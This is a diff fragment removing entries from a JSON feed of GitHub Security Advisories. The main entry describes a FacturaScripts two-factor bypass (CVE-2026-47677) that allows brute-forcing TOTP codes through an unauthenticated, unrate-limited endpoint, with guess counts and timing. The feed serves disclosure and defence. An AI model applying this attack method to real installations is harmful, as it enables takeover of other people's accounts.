`/opt/kimai/var/data/.appsecret`\n- The entrypoint.sh will create the file `/opt/kimai/.env.local` containing the `APP_SECRET`, either fetched from the Docker Environment or from the",
-      "link": "https://github.com/advisories/GHSA-jr9p-4h4j-6c58",
-      "published": "2026-07-14T00:07:59Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-52824"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47677",
-      "title": "FacturaScripts: Account takeover of any 2FA-enabled user",
-      "summary": "# Authentication bypass in FacturaScripts: `/login?action=two-factor-validation` accepts brute-forceable TOTP without password or CSRF protection\n\n## Summary\n\n`Core/Controller/Login.php::twoFactorValidationAction()` accepts an\nunauthenticated POST containing only `fsNick` and `fsTwoFactorCode`. If the\nTOTP value matches, the server issues a full `fsNick` + `fsLogkey` session\ncookie pair. The handler:\n\n1. **Does not verify the password** \u2014 the user is not required to have just\n   completed `loginAction`.\n2. **Does not call `validateFormToken()`** \u2014 no CSRF token is required (every\n   other action handler in the same file does call it).\n3. **Does not call `userHasManyIncidents()` before processing** \u2014 `loginAction`\n   and `changePasswordAction` both check this guard *before* doing work; the\n   2FA handler only writes to the incident list *after* a failure, and the\n   incident list is consulted by `loginAction` / `changePasswordAction` but\n   not by the 2FA handler itself. The endpoint therefore has **no\n   rate-limiting at all**.\n\nCombined with `TwoFactorManager::VERIFICATION_WINDOW = 8` (google2fa default\nis 1), 17 distinct six-digit codes are valid simultaneously and each remains\nvalid for ~4 minutes. The expected number of guesses to land a valid code is\n\n> N \u2248 ln(0.5) / ln(1 \u2212 17 / 10\u2076) \u2248 **40 800** attempts (50% success)\n\nOn a default LAMP install a single-laptop attacker sustains ~400 RPS from\none source IP \u2014 a few minutes per account.\n\nThe vulnerability gives **complete account takeover** of any 2FA-enabled\nuser to any unauthenticated network attacker who knows the target's nick.\nAdmin nicks are typically public information (`admin`, the company name,\nthe person's initials).\n\n## Severity\n\n**CVSS 4.0 base score: 9.3 \u2014 Critical**\n\nVector: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`\n\n| Metric | Value | Rationale |\n|---|---|---|\n| Attack Vector (AV) | Network (N) | One HTTP POST over the public internet. |\n| Attack Complexity (AC) | Low (L) | ",
-      "link": "https://github.com/advisories/GHSA-c67f-gmxw-mj93",
-      "published": "2026-07-13T23:35:48Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47677"
       ],
       "is_zero_day": false,
       "is_high_severity": true
